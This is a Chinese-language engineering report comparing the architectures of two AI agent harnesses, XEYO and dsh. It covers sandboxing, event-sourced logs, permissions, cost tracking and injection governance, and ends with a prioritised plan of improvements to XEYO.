14. **凭据 / 身份 / OTel 遥测三个 seam + `ctx.invariants` 注册表 + 强制双语 + Agent Note**

###### 31.3 XEYO 有、dsh 完全没有（设计层，去重后 12 项）

1. **注意力硬准入**（20 块登记表 + 硬顶 21 + 逐条理由 + 4 条执法测试 + 禁止裸 append）
2. **`env_channel` 伪造 tool 对声道**（根治说话人混淆）
3. **预算 / 死线四重护栏 + 收尾窗 + 预算类 T_now 块**
4. **成本口径治理**（峰谷价 + 实时价源 + 账本 + 归因 + 多代理成本）
5. **工作区 rewind**（v2/v3，崩溃恢复顺序 + 热路径精细对齐）
6. **跨会话记忆模型**（48 文件 + Tombstone + scope + 离线 simulator）
7. **Tauri 原生壳**（进程守护 + 解释器真探测 + 失败原因回显 + 自包含 venv 断言）
8. **桌面 UI 控制 / Screenshot / 桌宠**
9. **微信通道**（`channels/`）
10. **透明 Bash 路由**（`[routed: …]`，纯读命令换专用工具）
11. **斜杠命令 SSOT + 生成式 manifest 门禁**（35 条）
12. **多代理任务 DAG 的作用域互斥**（`scope_conflicts`）+ 成本归因结算

###### 31.4 第一轮结论的修正影响

| 第一轮结论 | 状态 |
|---|---|
| 「两端独立演化出『工具面冻结 + 网关新增』同一设计」 | **作废**（§0.1）。真相：取向相反，各自自洽 |
| 「`engine/scheduler.py` 写了无消费方」 | **作废**（§0.2）。真相：多代理 DAG 已接线；XEYO 缺的是**时间触发**定时 |
| 「XEYO SSE 25 类事件」 | **更正**为 20 个 dataclass / 19 个联合成员 |
| 「dsh 68 个服务缝」 | **更正**为 69 个唯一 `ctx.<name>`（70 行表） |
| 其余（沙箱/PTY/LSP/事件溯源/成本/记忆/壳/门禁等） | 本轮均获源码级支撑并细化 |

---

##### 32. 结论

**1. 第一轮说"两者是不同物种"，第二轮可以给出更硬的判据：它们把"最难的问题"定在了不同的层。**
XEYO 认定最难的是**模型注意力里出现了什么**，于是用"引擎文本立法 + 注入管线硬准入 + 执行层静默强制"三件事去解决；dsh 认定最难的是**任何一块能不能被换掉**，于是用"能力缝 + effect 回收 + 组合四层"去解决。这不是风格差异，是**问题定义的分歧**——它们甚至不冲突，但同一段代码不会同时服务两个目标。

**2. 上一轮那句"共同收敛"是我的错误，但它错得有价值。**
真相是：XEYO 冻结工具面 → 必须发明网关工具绕过自己；dsh 不冻结 → 不需要网关，但必须用类型化 RPC + 事件溯源保证客户端与日志一致。**互为镜像，而不是趋同。** 我原来看到的"趋同"，其实是我把 XEYO 的契约抄到了 dsh 那一列。

**3. 设计层的最大差距不是"功能缺",而是"缺一层"。**
沙箱、事件溯源、类型化 RPC、seam 机制——这四件事都不是"再加个功能"能补上的，它们是**别的东西成立的前提**。比如：没有事件溯源，"模型当时看到什么"永远无法证明；没有沙箱，Bash 内部永远没有第二道防线；没有 seam，任何行为变更都得改引擎。

**4. XEYO 的两项领先同样不是功能性的，而是"运营性"的。**
注意力硬准入（20 块 + 硬顶 + 4 条测试）与成本口径治理（峰谷价 + 账本 + 四重预算）解决的都不是"能不能跑"，而是"能不能长期跑并且说得清"。dsh 作为 developer preview 不需要这个；XEYO 作为要在用户机器上常驻的产品必须要有。

**5. 最值得 XEYO 借鉴的三件事（按性价比重排）**

| 序 | 借鉴项 | 为什么值 | 落点 |
|---|---|---|---|
| 1 | **事件溯源会话日志**（含 `request/header` 入日志） | 它是 fork / resume / telemetry / 迁移 / 快照回放 / 成本归因的**公共底座**。XEYO 现在的 transcript 是"结果"，不是"过程"，导致所有派生能力都要各写一遍 | `session/record_transcript.py` 改为事件追加；请求头单独落一类事件 |
| 2 | **沙箱执行层 `confine(argv, policy)`** | XEYO 现在 Bash 一落地就没有第二道防线；且 fail-closed 语义可以直接复用 XEYO 已有的"执行层静默报错"纪律 | `tools/bash_tool/` spawn 前统一过一道 confine，Windows 走 ACL 或降级为显式拒绝 |
| 3 | **能力缝 + 命名事件**（不必照搬 Cordis） | 把 `query_loop` 里 4 个内联点位（pre-step / request / llm stream / 工具三段）改成命名事件，今天的 guard 就能从"改引擎"变成"挂插件" | 第一步只做**命名**（事件 + 观测），不要求可替换 |

**6. 最值得 dsh 借鉴的一件事：T_now 式的注入治理。**
dsh 的插件自由是双刃剑——69 个 seam、255 个包，任何插件都能往上下文塞东西，而它只有"可重建"一条底线，**没有"这条内容该不该出现在注意力里"的门**。XEYO 的"登记表 + 硬顶 + 逐条存在理由 + 机器执法"是这套治理的完整范本，且已被证明可实施（20 块 + 4 条测试）。

**7. 一个更冷静的收尾。**
XEYO 的注意力铁律能让它产出**更干净**的模型轨迹——这是它的差异化资产，值得继续守。但"干净"不产生分叉能力、不产生隔离、不产生可编程接口。第二轮的全部结论可以压成一句：**XEYO 的问题是"缺一层"，不是"缺几个功能"；它现有的一切纪律，都应该被搬到那层地基之上，而不是用来替代那层地基。**

---

*取证边界：本轮由 6 路分队按能力域（循环/会话、工具/管线/权限、执行隔离/IO、prompt/模型/成本/记忆、扩展生态/编排、协议/前端/壳/工程）跨两端并行通读源码；主代理独立复核了全部加载性结论（dsh 无 `Mcp` 工具、`ToolRuntime.view()` 无缓存、`SESSION_FORMAT_VERSION=2`、XEYO 事件数、T_now 登记 20 块 + cap 21 + 4 条执法用例、scheduler 消费方、dsh seam 69 个）。dsh 侧核心包逐文件读，38 个 `ui-*` 包按入口/slot/contract 读、组件内部未逐行读，`native/landlock-run`、`code-runtime-worker-thread`、部分 tool provider 的 execute 实现未逐行读。XEYO 侧 `python/` 关键链逐段读，`memory/simulator`（11 文件）、`usage/ledger|attribution` 内部、`server/routers/*` 各路由实现体、`tui/src` 未逐行读。凡"未见"均为排除 `.venv` / `__pycache__` / `node_modules` 后穷举未命中。*



## 4.3 第三轮 · 实现级差异总表与结论

> 来源：**R3 实现面·实现级对比** · 原节「29. 实现级差异总表」（源 L2161–2246）

##### 29. 实现级差异总表

###### 29.1 「缺一层」级（不是缺功能）

| 层 | dsh | XEYO | 影响 |
|---|---|---|---|
| **OS 级沙箱** | `confine(argv, policy)` 四后端 + 探针 + fail-closed + 拒绝签名 | 无（仅路径级策略 + Job Object 资源限额） | 模型可让 bash 起子进程绕过一切策略 |
| **事件溯源会话日志** | 48 事件 + `seq` 连续 + `ignorable` 保守默认 + `surfaceOp` 强制 + 版本化 + 每 step 原始流 | 19 事件 + 消息级 transcript，无信封/序号/版本 | 无法逐字重建「模型当时看到什么」；压缩/改写无举证机制 |
| **端到端类型化协议** | typert 类型图 + RPC + 类型化错误详情 | 手写 Pydantic + 手写前端类型 | 前后端契约靠人工同步 |
| **组合层** | Bundle → Profile → Launcher patch → 用户 patch，可 dump 可复现 | settings.json 合并 | 扩展组合不可导出、不可复现 |
| **质量门** | per-file 100% + 文档完整性 + 快照回放 | 无覆盖率门、无 pre-commit、CI 仅 push 后生效 | 死代码与文档漂移无人拦 |
| **持久终端 + LSP + 工作流 + 定时 + Webhook** | 均有 | 均无 | 能力面缺口（非机制缺口） |

###### 29.2 「XEYO 独有且更深」级

| 项 | 实现深度 | dsh 状态 |
|---|---|---|
| T_now 注入管线 | 4 策略 + 20 块登记 + 硬顶 21 + 三层预算 + 类感知裁剪 + 机器执法 + 块级消融开关 + 逐条理由 | 无（只有动态 context 快照） |
| env_channel 声道 | 字节级伪造 tool 对 + copy-on-write + 结构类 4xx 回落 skip + 进程级备忘 + 契约测试禁行为引导词 | 无 |
| 成本治理 | 价格表 + 数据驱动峰谷 + split_usage 三重容错 + 80000 行账本 + key 指纹 + 归因 + C2 专账 + 校准账 | 无货币概念 |
| 权限策略实现 | 11 级分支顺序 + 写路径单向性 + bash 语义分析（193 行 / 5 正则 / 写目标反推）+ 指纹 v2 + 4 条 grant 豁免 + 风险分级 TTL | 二值策略 + fail-closed 四值结果（更简洁，但无路径级策略） |
| 记忆子系统 | 30 文件 + frontmatter + TTL 清理 + 写准入 + 配对安全切点；召回恒关（源码级开关） | 无（改为会话自查询工具） |
| 桌面壳 | Tauri + 真探测 + 错误回传 + 自包含 venv 断言 | 无 |
| 多会话协同 | peer presence / file conflict 块 + write scope + peer 热文件三选 ASK | 未见（沙箱兜底） |
| 任务 DAG 调度 | toposort + 环打破 + scope 冲突 + checkpoint + 合成 | 无（schedule 是时间轴不是关系图） |
| 观测域一致性 | bash 写目标反推 → 与 Write 同策略；路由标记 `[routed: …]`；T_now 与工具同通道 | 无此概念的显式实现 |

###### 29.3 同一问题的两种实现（逐项）

| 问题 | dsh 的实现 | XEYO 的实现 |
|---|---|---|
| 工具并发 | 有界池(10) + exclusive barrier + 顺序提交 + 运行期可插 barrier | 内联 `while pending` + 只读早跑 |
| 中断的 replay 有效性 | 未启动调用**合成错误结果** | 占位补全 + `interrupted` 锚 |
| 结果截断 | head/tail 各半 + spillStore + 定位符 | per-tool 16000 字符预算 + spill + `offload_read` 工具 |
| 审批无 answerer | `unavailable` → fail closed | DENY（写路径） |
| 审批身份 | request id + toolName | 指纹 v2（sha256 前 32 位，参数不入指纹） |
| 策略可见性 | 事件 log-only **+** 动态 context 渲染句子（尾插保前缀） | `runtime_mode_snapshot` T_now 块（directive 类） |
| 前缀断裂 | 如实记录 header change + 开新 series | 设计上避免（左段锁死 + 尾部追加） |
| 记忆 | 让模型自查询历史（5 个只读工具） | 自动记忆子系统（召回恒关） |
| 动态内容注入 | `systemPrompt.context()` → 真 user 消息 | env_channel 伪造 tool 对（脱离 user 角色） |
| 定时 vs 关系图 | 时间轴（after/at/every + workflow + ralph） | 关系图（DAG + scope 冲突 + 写锁） |
| 加工具的门 | 文档完整性 guard 强制 | 单表登记 + AGENTS 约定 |
| 自我修改 | **7 个 `cordis_*` 工具**（模型定义并挂载插件） | 无 |

---

##### 30. 结论与取证边界

###### 30.1 三句话结论

1. **实现级的差距主要体现在「有没有那一层」**：沙箱、事件溯源日志、类型化协议、组合层、质量门——dsh 这五处是**层**，XEYO 对应位置是**函数或约定**。补功能容易，补层难。
2. **XEYO 的实现深度集中在「引擎对模型注意力的治理」**：T_now 管线（字节级声道 + 三层预算 + 机器执法）、权限策略（11 级分支 + 单向性 + bash 语义分析）、成本治理（峰谷 + 账本 + 归因）——这三项的实现复杂度**不低于** dsh 任何一层，且 dsh 完全没有对应物。
3. **两端在编排上是互补而非对齐**：dsh 有时间轴（schedule/workflow/ralph/webhook），XEYO 有任务图（DAG + scope 冲突 + checkpoint）。谁都不是「更完整」的那一个。

###### 30.2 前两轮的更正是否还被维持

- 第二轮更正一（dsh **没有** `Mcp` 网关工具、工具面**不冻结**）：**本轮维持并加固**——`mcp-client` 直注 `ctx.tools`（`mcp__<server>__<tool>`，实测无网关工具），`systemPrompt.assemble()` 每 step 重算、`orderTools` 每次重排（§3.1、§19.1）。
- 第二轮更正二（`engine/scheduler.py` 不是死代码）：**本轮维持并细化**——它是一个真 DAG 调度器（toposort + 环打破 + scope 冲突 + checkpoint + `run_task_batch`），消费方含 `subagent_runner.py`、`server/session_pool.py:887`、`chat.py`、`coord/store.py`（§17.2）。XEYO 真缺的是**时间触发型定时任务**。
- 计数更正：XEYO SSE 实测 **19 个 EngineEvent + 20 个 dataclass（`PermissionExpiringEvent` 未进联合）+ 23 个 SSE 帧类型**（§2.2、§22.2）；dsh 会话事件实测 **48 个**（§2.1）；dsh 工具目录实测 **62 行 / 66 个工具名**（§7.4）；XEYO 工具实测 **26 个**（§7.5）；XEYO 路由实测 **101 条**（§22.2）。

###### 30.3 本轮新发现的、前两轮没有的实现事实（挑 8 条）

1. **dsh 的 `ToolRuntimeScheduler.prepare` 返回三态**（`dispatch` / `post-result` / `final-result`），其中后两者的差别就是「post-execute 瀑布还能不能改写」——这是并发优化与可拦截性的分界（§7.2）。
2. **dsh 的 `spill` 是头尾各半**（`ceil/floor`），不是「保头丢尾」（§8.2）。
3. **dsh 的审批结果词汇是封闭四值且只有 `allowed-once` 一个授予值**，无 answerer → `unavailable`（fail closed）（§9.1）。
4. **dsh 把「模型可见的策略句子」做成动态 context 而非事件**，理由写在注释里：**切换策略不重写稳定前缀**（§9.1）。
5. **dsh 的 `fs-sandbox` 包含性判定有词法快速路径 + `dev/ino` 身份回退**，专门处理 Windows 8.3 与大小写（§11.1）。
6. **dsh 的 hook codec 顶层 `decision` 只认 `approve`/`block`**，`allow`/`deny`/`ask` 必须写在 `hookSpecificOutput.permissionDecision` 里且**覆盖**顶层值（§20.1）。
7. **XEYO 的 SSE 是双通道**：`AssistantDelta` 编码成 OpenAI 兼容 chunk（`server/` 里 `assistant_delta` 零出现），其余走 `_xy_chunk` 旁路帧（§22.2）。
8. **XEYO 的 `_trim_tagged_blocks` 有「剩余不足 64 字符就整块丢弃」的实现细节**，且 directive/event 永不裁剪（§6.3）。

###### 30.4 取证边界（必读）

**本轮实际做的**：
- dsh：精读 20 个实现文件全文或大段（`agent.ts` 589 行、`tool-calls.ts` 290、`assistant-stream.ts` 140、`session/types.ts` 483、`system-prompt/index.ts` 614、`tools/index.ts` 关键段 255-455、`sandbox-local/index.ts` 300-560、`permission-presets/index.ts`、`user-approval/index.ts` 148-215、`escalation.ts` 130-175、`fs-sandbox/containment.ts` 1-60、`spill-policy/index.ts`、`hooks codec/events`、`skill-filesystem` 类型段、`mcp-client/index.ts` 头部、`args.ts`、`profile.ts`、`child-agent.ts`、`tool-ralph/index.ts` 关键段、`testing.md`、`tool-catalog.md` 全文）。
- 计数全部当场实测（会话事件 48、工具目录 62、包规模按目录聚合、测试 863）。
- XEYO：精读 `msgtypes/events.py` 全文 333 行、`prompt/system_prompt.py` 全文 217 行、`permissions/policy.py` 1319-1700 全文、`permission/store.py` 关键段、`prompt/t_now_strategy.py` 全文 133 行、`prompt/turn_context.py` 100-175、`extension/hooks.py` 全文 217 行、`pre_llm_inject.py` 登记表 + 裁剪算法 + `_tag_block`、`usage/pricing.py` 表与峰谷段、`engine/query_loop.py` 结构与守卫段、`server/routers/chat.py` 1080-1125、CLI 命令、路由计数、规模计数。

**本轮未逐行读的**：
- dsh：`typert` 四个子包内部实现（只读了包结构与用途）、`api` 118 文件的 RPC 装配细节、`client/*` 50 个包内部（只读了 Trajectory 的记录文件与几个入口）、`llm-deepseek` / `llm-pi-ai` 的 provider 实现细节（只读了 `catalog.ts` 一行证据）、`subagent` 各 provider 的完整实现（读了 seam 与深度控制）、`storage` 的 SQLite schema 机制、`compaction-basic` 的压缩算法本体（只读了阈值计算）、`workflow` / `webhook` / `jobs` 的内部实现、`acp` 协议细节。
- XEYO：`engine/query_loop.py` 2000 行中的主体执行段（读了循环头、守卫构造、并发段行号，未逐行读 800-2000 的每个分支）、`permissions/policy.py` 的 `_evaluate_bash` 193 行内部（读了常量与函数名，未逐行）、`memory/` 30 个模块（读了 `runtime.py` / `memdir.py` / `write_policy.py` 的符号，未读实现体）、`gui/src` 15 个目录（读了目录结构与规模，未读组件实现）、`engine/scheduler.py` 1110 行（读了符号表，未读 `Scheduler` 类实现体）、`rewind` 的 `execute`/`reconcile`（读到函数名与 WAL/原子写原语，未读完整流程）。

**任何「未见」断言的检索面**：全部做过排除 `.venv` / `__pycache__` / `node_modules` 的全仓 grep（dsh 的跨会话记忆、XEYO 的 landlock/seatbelt/bwrap/opentelemetry/workflow/PTY 等）。

**判据提醒**：本轮所有引用都带 `文件:行号`；若某条结论与第一、二轮冲突，**以本轮实测为准**（本轮是直接读源码，前两轮部分依赖子代理转述）。


## 4.4 第四轮 · 字段级差异总矩阵与结论

> 来源：**R4 枚举面·逐字段级对比** · 原节「§17 字段级差异总矩阵 等 2 节合并」（源 L1336–1387）

##### §17 字段级差异总矩阵

| # | 维度 | dsh | XEYO | 性质 |
|---|---|---|---|---|
| 1 | 事件类型数 | 51 | 20（19 生效） | dsh 多 31 |
| 2 | 事件封套 | 统一 7 字段 | 无封套 | 结构性 |
| 3 | 日志版本 | `SESSION_FORMAT_VERSION=2` + 迁移链 | 无 | 结构性 |
| 4 | 未知事件 | `ignorable` 缺席即拒绝重建 | 静默 | 安全方向相反 |
| 5 | surface 投影 | 显式三态 + replace + 来源引用 | 无 | 结构性 |
| 6 | 序号/游标 | 类型化 `SessionSeq`/`SessionLogOffset` | 无 | 结构性 |
| 7 | 沙箱 | 4 平台 + fail-closed + 升级仲裁 | 无（仅 Job Object + docker 旁径） | 缺一层 |
| 8 | 权限判定 | 事件瀑布 + 组合 | 单函数 6 分支 + 5 守卫 | 形态差 |
| 9 | 命令语义分析 | ❌ | ✅ 5 函数反推写目标 | XEYO 独有 |
| 10 | grant store | 审批制（`allowed-once`） | 指纹 v2 + 排除四类 | XEYO 更细 |
| 11 | 审批告知模型 | ❌ 刻意不给 | ✅ T_now 块 | 相反 |
| 12 | 逐轮注入 | 各插件自管 | T_now 20 块 + 硬顶 21 + 三层预算 | XEYO 独有 |
| 13 | 注入声道 | `MessageSource` 元数据 | 伪造 tool 对（结构隔离） | 相反 |
| 14 | 工具 schema | 3 字段（name/description/parameters） | meta 表 14 字段 | 维度不同 |
| 15 | 工具注册校验 | 包 invariant | 注册期 5 项硬失败 | XEYO 更严 |
| 16 | 工具执行 | 9 阶段事件瀑布（6 可拦截） | 顺序调用链（0 扩展点） | 形态差 |
| 17 | 结果后处理 | block / replace / context 三态 | 追加后缀 + 折叠 | 能力差 |
| 18 | 重复检测 | 3 档 [3,5,8]，**拒绝也计数** | [3,5,8]，轮内重置 | 近似对等 |
| 19 | 结果裁剪 | 头 4096 + marker + 尾 1024（阈值 8192） | 单阈值 16000 截断 | 策略差 |
| 20 | 外部化 | spill + 定位符 + 取回指引 | Bash 自带 spill + `offload_read` | 近似对等 |
| 21 | 压缩 | 独立 seam + 事务 + LLM 摘要 + 按模型覆盖（0.8/0.16/8192） | C0/C1/C2（确定性，LLM 摘要默认关） | 层级差 |
| 22 | 配对保护 | `toolPairingBalanced*` | `pair_safe_cut` | 对等 |
| 23 | LLM 流 | 7 变体 + block 生命周期 + replay 封套 | 2 delta 类 | 层级差 |
| 24 | 用量字段 | 6 | 19（context 分段 + 压缩态 + 成本源） | XEYO 更细 |
| 25 | 成本 | ❌ | pricing + ledger + 峰谷表（可 env 覆盖） | XEYO 独有 |
| 26 | KV 缓存 | provider 库 `cacheControlFormat` | 注入纪律（前缀不动） | 位置不同 |
| 27 | Hooks 点集 | 7（CC）/ 5（Codex） | 5 | 近似 |
| 28 | Hooks wire | 14 字段 + 双通道归一化 | 4 字段 outcome | 层级差 |
| 29 | Skill 暴露 | `ctx.skills` seam + catalog/loader 工具 | 单一 `Skill` 工具 | 层级差 |
| 30 | 子代理描述符 | 类型化 9 字段 + 持久化深度 | 白名单 + 短生命周期 | 层级差 |
| 31 | 定时任务 | ✅ | ❌ | dsh 独有 |
| 32 | 工作流 | ✅ workflow + ralph | ❌ | dsh 独有 |
| 33 | Webhook | ✅ | ❌ | dsh 独有 |
| 34 | 会话自查询工具 | 5 | ❌ | dsh 独有 |
| 35 | 自修改工具 | 7 个 `cordis_*` | ❌ | dsh 独有 |
| 36 | 持久终端 | 6 工具 | ❌ | dsh 独有 |
| 37 | rewind | ❌ | ✅ v2/v3 + 7 条路由 + GC 设置 | XEYO 独有 |
| 38 | 跨会话记忆 | ❌（穷举零命中） | ✅ `memory/` 27 模块 | XEYO 独有 |
| 39 | 预算/死线 | ❌ | ✅ BudgetTracker + 收尾窗 + wrap quota | XEYO 独有 |
| 40 | 桌面集成 | ❌ | ✅ Tauri + 桌宠 + 微信 + 截图 | XEYO 独有 |
| 41 | 协议 | 类型化 RPC + 双 SDK + ACP | REST 101 路由 + SSE 23 帧 | 形态差 |
| 42 | 前端 | 47 包 + slots | 单包 391 文件 | 结构差 |
| 43 | 覆盖率门 | per-file 100% | 无 | dsh 独有 |
| 44 | 浏览器快照 | ✅ PR gate | ❌ | dsh 独有 |
| 45 | fixture 迁移 | v0/v1/v2 + 迁移器 | ❌ | dsh 独有 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§20 本轮结论（一句话级） 等 2 节合并」（源 L1498–1505）

##### §20 本轮结论（一句话级）

1. **本轮的增量全在"可核验的枚举"**：51 个事件 × 逐字段、57 个工具名、62 条工具目录、101 条路由、23 个 SSE 帧、35 条斜杠命令、26 个工具 × 14 字段、20 个 T_now 块 × 3 类预算——每一条都能用一行命令复现。
2. **三处更正**：dsh 事件数是 **51**（第三轮的 48 漏了 3 个双斜杠键名）；`SESSION_FORMAT_VERSION=2` 的 bump 规则是"看 writer 不看 reader，加事件不 bump"；62 条工具目录 ≠ 62 个工具（去重 57）。
3. **dsh 的五处"层"**在字段级看更清楚：事件封套 7 字段 × 51 事件、沙箱 4 平台 × 逐参数、hook wire 14 字段 × 双通道归一化、compaction 事务 × 按模型覆盖、per-file 100% 覆盖门——**XEYO 在这五处的对应物都是"若干函数或约定"**。
4. **XEYO 的四处"独有资产"**在字段级同样清楚：T_now 20 块 + 三层预算 + 逐行裁剪算法、`env_channel` 伪造 tool 对（5 字段结构隔离）、grant 指纹 v2 + 四类不吃 grant 的排除、19 字段 UsageEvent + 峰谷可 env 覆盖——**dsh 这四处没有对应物**。
5. **两端的取舍是镜像的**：dsh 用"更厚的结构层"换可替换性与可迁移性（代价：51 类事件、255 包、863 测试文件的复杂度）；XEYO 用"更厚的注意力纪律与执行期不变量"换信息正确性（代价：无沙箱、无事件溯源、无覆盖率门、扩展点为 0）。



# 卷五 · 优化决策（路线 + 收益评估）

> 两份决策文档全文：先给候选池与排序，再给收益/适配双维打分。

## 5.1 优化路线：最适合用来优化 XEYO 的点（决策 A 全文）

> 来源：**决策 A·优化路线五轮总结** · 原节「五轮对比总结：最适合用来优化 XEYO 的点」（源 L1–532）

#### 五轮对比总结：最适合用来优化 XEYO 的点

> **本文性质**：不是第六轮对比，而是**决策文档**。前五轮回答"两端各是什么样"，本文只回答一件事：**在五轮发现的所有差异里，哪些点最适合用来改进 XEYO，按什么顺序做。**
>
> **取证口径**：本文所有事实引用均来自前五轮报告的实测行号，另在落笔前**新增核实了三处**（§2 的三条更正）。凡与前面轮次冲突，以本文为准并已给出复现命令。
>
> **目标读者**：决定"下一步做什么"的人。看完 §3 的表 + §4 的详解就够开工；§5 是红线自检，§6 是顺序，§7 是明确不做的事。

---

#### §0 五轮回顾（一页纸）

##### 0.1 五轮各自产出了什么

| 轮次 | 文件 | 行数 | 视角 | 回答的问题 | 该轮的主要更正 |
|---|---|---|---|---|---|
| 一 | `XEYO-vs-DeepSeekHarness-全量对比.md` | 605 | 功能面 | 有什么 / 没什么 | —（初版，含 1 处归属错误） |
| 二 | `...设计级对比-第二轮.md` | 1307 | 设计面 | 32 个系统怎么设计、为什么 | 更正一：dsh **没有** `Mcp` 网关工具、工具面**不冻结**（第一轮把 XEYO 的契约抄到了 dsh 列）；更正二：`engine/scheduler.py` 不是死代码 |
| 三 | `...实现级对比-第三轮.md` | 2246 | 实现面 | 函数签名 / 算法步骤 / 常量 | 计数更正：XEYO 19 事件 + 23 SSE 帧；dsh 48 事件 |
| 四 | `...逐字段级对比-第四轮.md` | 1505 | 枚举面 | 每个类型每个字段每个键名 | 更正：dsh 事件 **51**（第三轮正则漏 3 个双斜杠键）；`packages/client` **45** 子包；62 条工具目录 = **57** 唯一工具 |
| 五 | `...机制设计说明-第五轮.md` | 2017 | 机制面 | 同一个问题两端怎么解 | 新发现：`hotpath.py:1-13` 注释写的是 v3.0 旧合同；`usage/ledger.py:66-76` 明确写着"对齐 DeepSeek Harness 记账纪律" |

**累计 7680 行**，覆盖 dsh 全部 9080 个受控文件与 XEYO `python/`(1141 文件) + `gui/src`(391) + `tui/` + `src-tauri/`。

##### 0.2 五轮读下来的三句话

1. **dsh 强在"层"，XEYO 强在"纪律与运营"。**
   dsh 的五处是**可复用架构层**：事件溯源日志、沙箱、类型化协议、组合层（profile/bundle/preset）、质量门。XEYO 的四块是**把一件事做到底的产品能力**：注意力治理（T_now）、工作区可逆性（rewind 五件套）、权限细化（11 级链 + 指纹 v2）、成本治理（峰谷 + 账本 + 归因）。

2. **最根本的分岔是"可信边界放在哪"。**
   dsh 放内核（沙箱）与类型系统；XEYO 放文本分析与测试断言。**这决定了两端策略的粗细**——dsh 的权限策略可以粗，因为下面有内核兜底；XEYO 必须细，因为正则就是最后一道防线。

3. **两端是镜像，不是趋同。**
   XEYO 冻结工具面 → 必须发明网关工具绕过自己；dsh 不冻结 → 不需要网关，代价是靠类型化 RPC + 事件溯源保证一致。**同一段代码不会同时服务两个目标。**

##### 0.3 一个必须先说的口径修正

第五轮发现：`usage/ledger.py:66-76` 的注释逐条引用了 dsh 的 S2/S4/D-3 记账纪律。**所以两端是"架构独立、局部借鉴"，不是"完全独立演化"。** 这对本文的意义是：**借鉴不是破例，XEYO 已经在这么做了，且有先例可循。**

---

#### §1 筛选准则：什么叫"适合用来优化 XEYO"

五轮一共列出上百条差异。**不是每条都值得做**——dsh 的很多能力是它"255 个包 + developer preview"定位的产物，搬过来只会让 XEYO 变重。本文用五条准则筛，**五条全过才进候选池**。

| # | 准则 | 具体判据 | 反例（因此被排除） |
|---|---|---|---|
| **S1** | **不破坏引擎铁律** | 不往模型可见文本里塞指令/评价/导演；限制只在执行层表达 | 「在 prompt 里提示模型别乱写文件」——违反铁律第 1 条 |
| **S2** | **可独立落地（旁路优先）** | 能以 feature flag / 独立模块上线，不阻塞主链；符合 `AGENTS.md` 硬规矩 #4 | 「重写会话层」——无法旁路，一动就是全仓 |
| **S3** | **收益可证伪** | 有明确判据：注入崩溃能复现、截断输出能检查、越权写能被拦 | 「架构更优雅」——无法证伪 |
| **S4** | **不引入巨石** | 新逻辑进新模块；既有巨石只留接线点（`AGENTS.md` #7） | 「把 query_loop 拆了」——2000 行的巨石重构 |
| **S5** | **Windows 可用** | XEYO 是 Tauri 桌面产品，主战场是 Windows | 「上 bubblewrap」——Linux-only，Windows 用户零收益 |

**另加两条加权**（不淘汰，只排序）：

- **W1 连带简化**：做完之后能让别的机制变简单（沙箱做完，权限链可以从 11 级降到 3 级）。
- **W2 开源友好**：diff 自包含、可单测、不依赖私有数据——适合作为独立 PR 提交或被外部贡献者复现。

---

#### §2 落笔前新增核实的三处事实更正（重要）

**这三处直接改变了推荐的形态。** 前五轮有三条建议是基于不准确的事实提的，如果不先纠正，会给出"要做很多其实已经做了的事"的假建议。

##### 2.1 更正一：XEYO **已经有投影层**，差距是"算子种类"而不是"有没有层"

**前五轮的表述**：多轮报告写「XEYO 的 transcript 是**直出**的，没有投影层——加投影层等于重写会话层」（第五轮 C-2）。

**实测事实**：

```
session/surface.py        150 行    fold_surface_rows()  ← 投影算子
session/hydrate.py:131-133         messages_from_rows(resolve_transcript_rows(fold_surface_rows(rows), path))
```

`session/surface.py:1-13` 的文件头注释写得非常清楚：

> `append-only JSONL 是唯一真相，回溯不再重写文件，而是追加一条 surface_op marker 行，把「当时可见面」从 shadow_from 起的区间影子化（shadow）——原始行永不改写、永不移动。`
> `模型可见历史 = 对合并日志（含轮转归档 .old2→.old1→当前）做一次 fold_surface_rows`
> `人类侧（原始文件审计…）仍可读到全部 append-origin 行——与「模型看 surface、人看 append-origin」的分工一致。`

**这跟 dsh 的 surface 层是同一个设计**：append-only 是唯一真相，模型可见面 = fold。dsh 的 `surface.ts:1-6` 写的是 *"an ordered view of events that produce LLM messages. The append-only log remains the source of truth."*——**几乎逐字同义**。

**那真正的差距是什么？算子种类与来源追踪：**

| | dsh | XEYO |
|---|---|---|
| 算子 | `SurfaceOp = 'append' \| { op:'replace', ... }`（`core/session/src/types.ts`） | 只有 2 个：`rewind` / `rewind_undo`（`session/surface.py:34-35`） |
| 通用性 | **通用替换**：任意区间可被替换（压缩、覆盖、注入都用它） | **单用途**：只服务 rewind 的影子化 |
| 来源追踪 | `sourceEventSeqs` —— 记录"这条可见事件由哪些原始事件派生"（`types.ts`，实体见 `session/index.ts:706`） | **无**。marker 只有 `rewind_id` + `shadow_from` |
| 派生函数 | `deriveEventMessage(event)` —— **每条事件到消息的投影规则只有一份**，`Session.deriveMessages` 与外部重建器共用同一个函数 | `messages_from_rows` —— 有，但没有"逐事件投影规则"的单一权威点 |
| 人类侧通道 | `isAppendSurfaceEvent()` 显式区分"模型面 vs 人类转录面"（`surface.ts:44-75`） | 靠注释约定（`surface.py:9-10`） |

**结论修正**：XEYO 不需要"加一个投影层"（已经有了），需要的是**把只有单用途的投影层扩成通用算子 + 加来源追踪**。这是**小一个数量级的工程**，而且可以增量做——**这条从 P2 战略项下调到 P1**。

> 复现：`python/session/surface.py`（读 1-25 行看设计声明、68-115 看 fold 算法）、`python/session/hydrate.py:128-146`、`dsh-src/packages/core/session/src/surface.ts:1-75`。

##### 2.2 更正二：XEYO 的 JSONL **已有写后缓冲 + fsync + 轮转**，只缺"撕裂尾修复 + 跨进程租约"

**前五轮的表述**：「XEYO 的 session JSONL 是**直接追加**，无缓冲/租约」（第五轮 C-2）；「XEYO 现在的 transcript 是"结果"不是"过程"」。

**实测事实**（`session/record_transcript.py`，419 行）：

| 能力 | dsh | XEYO 实测 |
|---|---|---|
| 后台写线程 | ✅ `session-persistence-jsonl` 写后缓冲 | ✅ `_writer_loop()` `:122-140`，线程名 `transcript-writer` |
| 批量聚合 | ✅ | ✅ `_write_batch()` `:143-156`，按 path 分组一次写完 |
| 落盘等待 | ✅ | ✅ `flush_pending_sync(timeout=5.0)` `:183-191` + `atexit` 排空 `:194-202` |
| **fsync** | ✅ | ✅ **`os.fsync(f.fileno())` `:156`**，注释写「崩溃窗口不丢会话尾部(G107)」 |
| 临界区 | ✅ | ✅ `_disk_lock` `:39`，覆盖 rotate + append（注释标 G107 事故） |
| 轮转 | ✅ | ✅ 32MB 轮转、保留 2 代归档 `:50-65`、`_maybe_rotate`、跨轮转可恢复 |
| 去重 | ✅ | ✅ 按消息 id，`_load_written_ids` + `known_ids` 缓存 |
